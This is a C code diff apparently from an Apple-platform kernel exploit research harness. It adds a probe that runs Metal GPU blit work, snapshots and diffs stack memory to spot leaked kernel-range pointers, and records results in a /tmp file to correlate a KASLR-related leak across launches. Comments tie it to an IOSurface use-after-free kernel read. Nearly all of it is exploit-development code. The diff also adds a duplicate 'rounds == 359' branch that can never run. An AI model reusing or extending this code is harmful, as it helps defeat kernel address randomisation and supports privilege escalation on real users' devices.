@@ -15009,6 +15009,343 @@ r356_done:
     fflush(stdout);
 }
 
+/* r356: Pure diff scan + cross-launch correlation via /tmp state file */
+static void r356_probe(void) {
+    rlog("\n=== r356: Stack Diff Scan + Cross-Launch KASLR Correlation ===\n\n");
+    rlog("  r355 cross-launch: 0xfffffffefda747cf vs 0xfffffffefd2f87cf\n");
+    rlog("  Delta = 0x77C000 (page-aligned!) -> KASLR-correlated leak\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+
+    /* ---- Part 1: Find ALL tag=30 stack regions, do 3-pass diff ---- */
+    rlog("--- Part 1: 3-pass diff scan of all stack regions ---\n");
+    fflush(stdout);
+
+    /* GPU trigger */
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+    void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+    void *dev = NULL, *cmdQ = NULL;
+    if (metal_lib) {
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        if (createDev) dev = createDev();
+        if (dev) cmdQ = ((void*(*)(void*,void*))msgSend)(dev, regSel("newCommandQueue"));
+    }
+
+    /* Collect all tag=30 regions */
+    typedef struct { mach_vm_address_t addr; mach_vm_size_t sz; } sregion_t;
+    sregion_t sregs[16];
+    int n_sregs = 0;
+    {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+        while (1) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+            if (info.user_tag == 30 && info.protection >= 3 && n_sregs < 16) {
+                sregs[n_sregs++] = (sregion_t){addr, sz};
+                rlog("  Stack[%d]: 0x%llx sz=0x%llx\n", n_sregs-1,
+                    (unsigned long long)addr, (unsigned long long)sz);
+            }
+            addr += sz;
+        }
+    }
+
+    /* Allocate snapshot buffer for the largest interesting region */
+    /* Use only Stack[1] if it exists, else Stack[0] */
+    int target_idx = (n_sregs > 1) ? 1 : 0;
+    if (n_sregs == 0) {
+        rlog("  No stack regions found!\n");
+        goto r356_cleanup;
+    }
+    mach_vm_address_t taddr = sregs[target_idx].addr;
+    size_t tsz = (size_t)sregs[target_idx].sz;
+    if (tsz > 1048576) tsz = 1048576; /* cap at 1MB */
+    size_t nqw = tsz / 8;
+
+    rlog("  Target: Stack[%d] at 0x%llx, scanning %zu qwords\n\n", target_idx,
+        (unsigned long long)taddr, nqw);
+
+    uint64_t *snap0 = (uint64_t *)malloc(tsz);
+    uint64_t *snap1 = (uint64_t *)malloc(tsz);
+    uint64_t *snap2 = (uint64_t *)malloc(tsz);
+    if (!snap0 || !snap1 || !snap2) {
+        rlog("  malloc failed!\n");
+        free(snap0); free(snap1); free(snap2);
+        goto r356_cleanup;
+    }
+
+    /* Pass 0: snapshot */
+    memcpy(snap0, (void *)(uintptr_t)taddr, tsz);
+    rlog("  Pass 0: snapshot taken\n");
+
+    /* GPU work */
+    if (cmdQ) {
+        void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+            dev, regSel("newBufferWithLength:options:"), (size_t)131072, 0UL);
+        if (buf) {
+            for (int i = 0; i < 3; i++) {
+                void *cb = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+                if (!cb) continue;
+                void *blit = ((void*(*)(void*,void*))msgSend)(cb, regSel("blitCommandEncoder"));
+                if (blit) {
+                    typedef struct { unsigned long l,s; } NSR356;
+                    NSR356 r = {0, 131072};
+                    ((void(*)(void*,void*,void*,NSR356,uint8_t))msgSend)(
+                        blit, regSel("fillBuffer:range:value:"), buf, r, 0xAA+i);
+                    ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                }
+                ((void(*)(void*,void*))msgSend)(cb, regSel("commit"));
+                ((void(*)(void*,void*))msgSend)(cb, regSel("waitUntilCompleted"));
+            }
+            ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+        }
+    }
+
+    /* Pass 1: snapshot */
+    memcpy(snap1, (void *)(uintptr_t)taddr, tsz);
+    rlog("  Pass 1: snapshot taken\n");
+
+    /* More GPU work */
+    if (cmdQ) {
+        void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+            dev, regSel("newBufferWithLength:options:"), (size_t)262144, 0UL);
+        if (buf) {
+            for (int i = 0; i < 5; i++) {
+                void *cb = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+                if (!cb) continue;
+                void *blit = ((void*(*)(void*,void*))msgSend)(cb, regSel("blitCommandEncoder"));
+                if (blit) {
+                    typedef struct { unsigned long l,s; } NSR356c;
+                    NSR356c r = {0, 262144};
+                    ((void(*)(void*,void*,void*,NSR356c,uint8_t))msgSend)(
+                        blit, regSel("fillBuffer:range:value:"), buf, r, 0xDD+i);
+                    ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                }
+                ((void(*)(void*,void*))msgSend)(cb, regSel("commit"));
+                ((void(*)(void*,void*))msgSend)(cb, regSel("waitUntilCompleted"));
+            }
+            ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+        }
+    }
+
+    /* Pass 2: snapshot */
+    memcpy(snap2, (void *)(uintptr_t)taddr, tsz);
+    rlog("  Pass 2: snapshot taken\n\n");
+
+    /* Diff analysis */
+    rlog("  === DIFF: Pass 0 vs Pass 1 ===\n");
+    int diff01 = 0;
+    typedef struct { size_t off; uint64_t v0; uint64_t v1; } diff_t;
+    diff_t diffs01[50];
+    for (size_t i = 0; i < nqw && diff01 < 50; i++) {
+        if (snap0[i] != snap1[i]) {
+            diffs01[diff01] = (diff_t){i*8, snap0[i], snap1[i]};
+            rlog("    +%zu: 0x%llx -> 0x%llx", i*8,
+                (unsigned long long)snap0[i], (unsigned long long)snap1[i]);
+            uint64_t v0 = snap0[i], v1 = snap1[i];
+            int v0k = (v0 >> 32) >= 0xFFFFFFF0UL && v0 != 0 && v0 != 0xFFFFFFFFFFFFFFFFULL;
+            int v1k = (v1 >> 32) >= 0xFFFFFFF0UL && v1 != 0 && v1 != 0xFFFFFFFFFFFFFFFFULL;
+            if (v0k && v1k) {
+                int64_t delta = (int64_t)(v1 - v0);
+                rlog(" [BOTH_KRANGE delta=%lld]", (long long)delta);
+            } else if (v0k || v1k) {
+                rlog(" [%s=KRANGE]", v0k ? "OLD" : "NEW");
+            }
+            rlog("\n");
+            diff01++;
+        }
+    }
+    rlog("  Total diffs 0->1: %d\n\n", diff01);
+
+    rlog("  === DIFF: Pass 1 vs Pass 2 ===\n");
+    int diff12 = 0;
+    for (size_t i = 0; i < nqw && diff12 < 50; i++) {
+        if (snap1[i] != snap2[i]) {
+            rlog("    +%zu: 0x%llx -> 0x%llx", i*8,
+                (unsigned long long)snap1[i], (unsigned long long)snap2[i]);
+            uint64_t v0 = snap1[i], v1 = snap2[i];
+            int v0k = (v0 >> 32) >= 0xFFFFFFF0UL && v0 != 0 && v0 != 0xFFFFFFFFFFFFFFFFULL;
+            int v1k = (v1 >> 32) >= 0xFFFFFFF0UL && v1 != 0 && v1 != 0xFFFFFFFFFFFFFFFFULL;
+            if (v0k && v1k) {
+                int64_t delta = (int64_t)(v1 - v0);
+                rlog(" [BOTH_KRANGE delta=%lld]", (long long)delta);
+            } else if (v0k || v1k) {
+                rlog(" [%s=KRANGE]", v0k ? "OLD" : "NEW");
+            }
+            rlog("\n");
+            diff12++;
+        }
+    }
+    rlog("  Total diffs 1->2: %d\n\n", diff12);
+
+    /* ---- Part 2: Find the fill pattern and extract its value ---- */
+    rlog("--- Part 2: Fill pattern analysis ---\n");
+    {
+        /* Find runs of identical kernel-range values */
+        uint64_t fill_val = 0;
+        int fill_start = -1, fill_len = 0, best_len = 0;
+        uint64_t best_fill = 0;
+        int best_start = 0;
+
+        for (size_t i = 0; i < nqw; i++) {
+            uint64_t v = snap2[i];
+            if ((v >> 32) >= 0xFFFFFFF0UL && v != 0 && v != 0xFFFFFFFFFFFFFFFFULL &&
+                (v & 0xFFFFFFFF00000000ULL) != 0xFFFFFFFF00000000ULL) {
+                if (v == fill_val) {
+                    fill_len++;
+                } else {
+                    if (fill_len > best_len) {
+                        best_len = fill_len;
+                        best_fill = fill_val;
+                        best_start = fill_start;
+                    }
+                    fill_val = v;
+                    fill_start = (int)i;
+                    fill_len = 1;
+                }
+            } else {
+                if (fill_len > best_len) {
+                    best_len = fill_len;
+                    best_fill = fill_val;
+                    best_start = fill_start;
+                }
+                fill_val = 0;
+                fill_len = 0;
+            }
+        }
+        if (fill_len > best_len) {
+            best_len = fill_len;
+            best_fill = fill_val;
+            best_start = fill_start;
+        }
+
+        if (best_len >= 10) {
+            rlog("  Fill pattern: 0x%llx repeated %d times at +%d to +%d\n",
+                (unsigned long long)best_fill, best_len,
+                best_start * 8, (best_start + best_len) * 8);
+            rlog("  Low 12 bits: 0x%03x  Low byte: 0x%02x\n",
+                (unsigned)(best_fill & 0xFFF), (unsigned)(best_fill & 0xFF));
+
+            /* This fill value is the KASLR-correlated leak! Extract the kernel address */
+            uint64_t base_component = best_fill & ~0xFFFULL; /* Zero the low 12 (flags) bits */
+            rlog("  Address component (high bits): 0x%llx\n", (unsigned long long)base_component);
+            rlog("  If PTE format: phys addr ≈ 0x%llx\n",
+                (unsigned long long)((best_fill >> 12) << 12));
+        } else {
+            rlog("  No significant fill pattern found (best run: %d)\n", best_len);
+        }
+    }
+
+    /* ---- Part 3: Cross-launch comparison via /tmp ---- */
+    rlog("\n--- Part 3: Cross-launch correlation (via /tmp) ---\n");
+    fflush(stdout);
+    {
+        /* Find the fill value from pass 2 snapshot */
+        uint64_t fill_val = 0;
+        int fill_count = 0;
+        for (size_t i = 0; i < nqw; i++) {
+            uint64_t v = snap2[i];
+            if ((v >> 32) >= 0xFFFFFFF0UL && v != 0 && v != 0xFFFFFFFFFFFFFFFFULL &&
+                (v & 0xFFFFFFFF00000000ULL) != 0xFFFFFFFF00000000ULL) {
+                if (fill_val == 0) fill_val = v;
+                if (v == fill_val) fill_count++;
+            }
+        }
+        rlog("  Current fill: 0x%llx (count=%d)\n", (unsigned long long)fill_val, fill_count);
+
+        struct timeval boottime;
+        size_t bt_size = sizeof(boottime);
+        int mib[2] = { CTL_KERN, KERN_BOOTTIME };
+        sysctl(mib, 2, &boottime, &bt_size, NULL, 0);
+        rlog("  Boot time: %ld\n", (long)boottime.tv_sec);
+
+        /* Read previous state from /tmp */
+        FILE *sf = fopen("/tmp/r356_state.bin", "rb");
+        if (sf) {
+            uint32_t magic = 0;
+            fread(&magic, 4, 1, sf);
+            if (magic == 0xDEAD0356) {
+                uint64_t prev_bt = 0, prev_fill = 0;
+                uint32_t prev_count = 0;
+                fread(&prev_bt, 8, 1, sf);
+                fread(&prev_fill, 8, 1, sf);
+                fread(&prev_count, 4, 1, sf);
+                fclose(sf);
+
+                rlog("  Previous: fill=0x%llx count=%u boot=%llu\n",
+                    (unsigned long long)prev_fill, prev_count, (unsigned long long)prev_bt);
+
+                int same_boot = ((uint64_t)boottime.tv_sec == prev_bt);
+                rlog("  Same boot: %s\n", same_boot ? "YES" : "NO");
+
+                if (prev_fill != 0 && fill_val != 0) {
+                    int64_t delta = (int64_t)(fill_val - prev_fill);
+                    uint64_t udelta = (uint64_t)(delta < 0 ? -delta : delta);
+                    rlog("  Fill delta: %lld (0x%llx)\n", (long long)delta, (unsigned long long)udelta);
+                    rlog("  Page-aligned (4K): %s\n", (udelta & 0xFFF) == 0 ? "YES" : "NO");
+                    rlog("  Page-aligned (16K): %s\n", (udelta & 0x3FFF) == 0 ? "YES" : "NO");
+
+                    if ((udelta & 0xFFF) == 0) {
+                        /* The fill value's address component shifts by page-aligned amounts */
+                        /* Strip flags and compute addresses */
+                        uint64_t curr_addr = fill_val & ~0xFFFULL;
+                        uint64_t prev_addr = prev_fill & ~0xFFFULL;
+                        int64_t addr_delta = (int64_t)(curr_addr - prev_addr);
+                        rlog("\n  *** KASLR ANALYSIS ***\n");
+                        rlog("  Previous addr component: 0x%llx\n", (unsigned long long)prev_addr);
+                        rlog("  Current addr component:  0x%llx\n", (unsigned long long)curr_addr);
+                        rlog("  Addr delta: %lld (0x%llx)\n", (long long)addr_delta,
+                            (unsigned long long)(uint64_t)addr_delta);
+                        if (same_boot) {
+                            rlog("  SAME BOOT: KASLR slide is constant, so this is HEAP ASLR\n");
+                        } else {
+                            rlog("  DIFFERENT BOOT: delta may reflect KASLR slide change!\n");
+                        }
+                    }
+                }
+            } else {
+                fclose(sf);
+                rlog("  State file corrupt\n");
+            }
+        } else {
+            rlog("  No previous state (first run)\n");
+        }
+
+        /* Write current state */
+        sf = fopen("/tmp/r356_state.bin", "wb");
+        if (sf) {
+            uint32_t magic = 0xDEAD0356;
+            fwrite(&magic, 4, 1, sf);
+            uint64_t bt = (uint64_t)boottime.tv_sec;
+            fwrite(&bt, 8, 1, sf);
+            fwrite(&fill_val, 8, 1, sf);
+            uint32_t fc = (uint32_t)fill_count;
+            fwrite(&fc, 4, 1, sf);
+            fclose(sf);
+            rlog("  State saved to /tmp/r356_state.bin\n");
+        }
+    }
+
+    free(snap0);
+    free(snap1);
+    free(snap2);
+
+r356_cleanup:
+    if (cmdQ) ((void(*)(void*,void*))msgSend)(cmdQ, regSel("release"));
+    if (metal_lib) dlclose(metal_lib);
+    rlog("\n=== r356 complete ===\n");
+    fflush(stdout);
+}
+
 /* r355: Confirm kernel heap leak stability and cross-launch correlation */
 static void r355_probe(void) {
     rlog("\n=== r355: Kernel Heap Leak — Stability + Cross-Launch + Offset Calc ===\n\n");
@@ -52219,6 +52556,14 @@ new_modes:
             rlog("*** rounds=359: Cross-Launch Correlation + UAF Kernel Read ***\n");
             rlog("  r355: stable kptr 0xfffffffefbbdc7cf at Stack[1]+468456.\n");
             rlog("  r356: cross-launch comparison + IOSurface UAF field read.\n\n");
+            fflush(stdout);
+            r356_probe();
+            goto done;
+        }
+        if (rounds == 359) {
+            rlog("*** rounds=359: Stack Diff + Cross-Launch KASLR Correlation ***\n");
+            rlog("  r355: fill pattern 0xFFFFFFFEFDxxxxCF shifts by page-aligned delta\n");
+            rlog("  r356: snapshot diff + /tmp state file for cross-launch compare\n\n");
             fflush(stdout);
             r356_probe();
             goto done;
